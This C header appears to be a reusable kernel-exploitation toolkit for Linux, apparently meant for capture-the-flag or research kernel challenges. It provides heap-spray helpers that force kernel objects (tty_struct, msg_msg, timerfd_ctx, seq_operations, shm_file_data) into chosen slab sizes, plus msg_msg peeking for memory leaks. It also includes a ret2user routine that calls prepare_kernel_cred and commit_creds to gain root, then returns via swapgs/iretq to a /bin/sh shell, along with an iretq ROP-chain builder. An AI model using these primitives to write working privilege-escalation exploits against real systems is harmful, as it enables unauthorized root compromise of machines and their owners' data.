#ifndef __KUTIL_H__
#define __KUTIL_H__

#define USE_KMALLOC32
#define USE_KMALLOC256
#define USE_KMALLOC1024
#define USE_ROP
#define USE_COMM
#define USE_DUMP

#include <stdio.h>
#include <stdlib.h>
#define ABORT(msg)                                                             \
  do {                                                                         \
    perror(msg);                                                               \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

#define PAGE_SIZE 0x1000

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#if defined(USE_KMALLOC32)
#define USE_SEQ_OPERATIONS
#define USE_SHM_FILE_DATA
#endif

#if defined(USE_KMALLOC256)
#define USE_TIMERFD_CTX
#endif

#if defined(USE_KMALLOC1024)
#define USE_TTY_STRUCT
#endif

#define USE_MSG_MSG

#if defined(USE_SEQ_OPERATIONS)
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int kmalloc32_seq_operations() {
  int fd = open("/proc/self/stat", O_RDONLY);
  if (fd == -1) {
    ABORT("open");
  }

  return fd;
}

void kfree_seq_operations(int fd) { close(fd); }
#endif

#if defined(USE_SHM_FILE_DATA)
#include <sys/ipc.h>
#include <sys/shm.h>

int kmalloc32_shm_file_data() {
  int id = shmget(IPC_PRIVATE, PAGE_SIZE, 0600);
  if (id == -1) {
    ABORT("shmget");
  }

  void *addr = shmat(id, NULL, 0);
  if (addr == (void *)-1) {
    ABORT("shmat");
  }

  return id;
}
#endif

#if defined(USE_TIMERFD_CTX)
#include <sys/timerfd.h>
#include <unistd.h>

int kmalloc256_timerfd_ctx() {
  int fd = timerfd_create(CLOCK_REALTIME, 0);
  if (fd == -1) {
    ABORT("timerfd_create");
  }

  struct itimerspec timerspec = {{0, 0}, {100, 0}};
  if (timerfd_settime(fd, 0, &timerspec, NULL) == -1) {
    ABORT("timerfd_settime");
  }

  return fd;
}

void kfree_timerfd_ctx(int fd) {
  close(fd);
  sleep(1);
}
#endif

#if defined(USE_TTY_STRUCT)
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int kmalloc1024_tty_struct() {
  int fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  if (fd == -1) {
    ABORT("open");
  }

  return fd;
}

void kfree_tty_struct(int fd) { close(fd); }
#endif

#if defined(USE_MSG_MSG)
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>

#include <assert.h>
#include <string.h>

#define MSG_COPY 040000
#define HDRLEN_MSG 0x30
#define HDRLEN_SEG 0x08
#define MTEXTLEN_MSG(size) ((size)-HDRLEN_MSG)
#define MTEXTLEN_SEG(size) ((size) + PAGE_SIZE - HDRLEN_MSG - HDRLEN_SEG)

#if defined(__GLIBC__)
struct msgbuf {
  long mtype;
  char mtext[1];
};
#endif

struct msgbuf *new_msgbuf(size_t size) {
  struct msgbuf *msgbuf = (struct msgbuf *)malloc(sizeof(long) + size);
  if (!msgbuf) {
    ABORT("malloc");
  }
  msgbuf->mtype = 1;
  memset(msgbuf->mtext, 0, size);

  return msgbuf;
}

void kmalloc_msg(int *msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  if (*msgid == -1) {
    *msgid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (*msgid == -1) {
      ABORT("msgget");
    }
  }

  struct msgbuf *msgbuf = new_msgbuf(MTEXTLEN_MSG(size));
  int err = msgsnd(*msgid, msgbuf, MTEXTLEN_MSG(size), 0);
  if (err == -1) {
    ABORT("msgsnd");
  }

  free(msgbuf);
}

void kmalloc_msgseg(int *msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_SEG);

  if (*msgid == -1) {
    *msgid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (*msgid == -1) {
      ABORT("msgget");
    }
  }

  struct msgbuf *msgbuf = new_msgbuf(MTEXTLEN_SEG(size));
  int err = msgsnd(*msgid, msgbuf, MTEXTLEN_SEG(size), 0);
  if (err == -1) {
    ABORT("msgsnd");
  }

  free(msgbuf);
}

struct msgbuf *kfree_msg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  struct msgbuf *msgbuf = new_msgbuf(MTEXTLEN_MSG(size));
  int err = msgrcv(msgid, msgbuf, MTEXTLEN_MSG(size), 0, 0);
  if (err == -1) {
    ABORT("msgrcv");
  }

  return msgbuf;
}

struct msgbuf *kfree_msgseg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_SEG);

  struct msgbuf *msgbuf = new_msgbuf(MTEXTLEN_SEG(size));
  int err = msgrcv(msgid, msgbuf, MTEXTLEN_SEG(size), 0, 0);
  if (err == -1) {
    ABORT("msgrcv");
  }

  return msgbuf;
}

struct msgbuf *peek_msg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_MSG);

  struct msgbuf *msgbuf = new_msgbuf(MTEXTLEN_MSG(size));
  int err = msgrcv(msgid, msgbuf, MTEXTLEN_MSG(size), 0, MSG_COPY | IPC_NOWAIT);
  if (err == -1) {
    ABORT("msgrcv");
  }

  return msgbuf;
}

struct msgbuf *peek_msgseg(int msgid, size_t size) {
  assert(size <= PAGE_SIZE && size >= HDRLEN_SEG);

  struct msgbuf *msgbuf = new_msgbuf(MTEXTLEN_SEG(size));
  int err = msgrcv(msgid, msgbuf, MTEXTLEN_SEG(size), 0, MSG_COPY | IPC_NOWAIT);
  if (err == -1) {
    ABORT("msgrcv");
  }

  return msgbuf;
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef USE_ROP
#include <unistd.h>

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

void save_state() {
  asm(".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;");
}

void shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
}

unsigned long prepare_kernel_cred;
unsigned long commit_creds;

void ret2user() {
  asm(".intel_syntax noprefix;"
      "mov rax, prepare_kernel_cred;"
      "xor rdi, rdi;"
      "call rax;"
      "mov rdi, rax;"
      "mov rax, commit_creds;"
      "call rax;"
      "swapgs;"
      "mov r15, user_ss;"
      "push r15;"
      "mov r15, user_sp;"
      "push r15;"
      "mov r15, user_rflags;"
      "push r15;"
      "mov r15, user_cs;"
      "push r15;"
      "mov r15, shell;"
      "push r15;"
      "iretq;"
      ".att_syntax;");
}

void rop_iretq(unsigned long *p, void *rip) {
  if (!rip) {
    rip = (void *)shell;
  }

  *p++ = (unsigned long)rip;
  *p++ = user_cs;
  *p++ = user_rflags;
  *p++ = user_sp;
  *p++ = user_ss;
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef USE_COMM
#include <sys/prctl.h>

void set_comm(char *name) {
  if (prctl(PR_SET_NAME, name) == -1) {
    ABORT("prctl");
  }
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifdef USE_DUMP
#include <stdint.h>
#include <stdio.h>

void dump(uint8_t *p, size_t len) {
  size_t i;
  for (i = 0; i + 16 <= len; i += 16) {
    printf("[%08zx] ", i);

    size_t j;
    for (j = 0; j < 16; j++) {
      printf("%02x", p[i + j]);
    }

    printf(" ");
    printf("%016lx %016lx", ((uint64_t *)&p[i])[0], ((uint64_t *)&p[i])[1]);

    printf(" ");
    for (j = 0; j < 16; j++) {
      printf("%c", p[i + j]);
    }

    printf("\n");
  }

  if (i < len) {
    printf("[%08zx] ", i);

    for (; i < len; i++) {
      printf("%02x", p[i]);
    }

    printf("\n");
  }
}
#endif

#endif
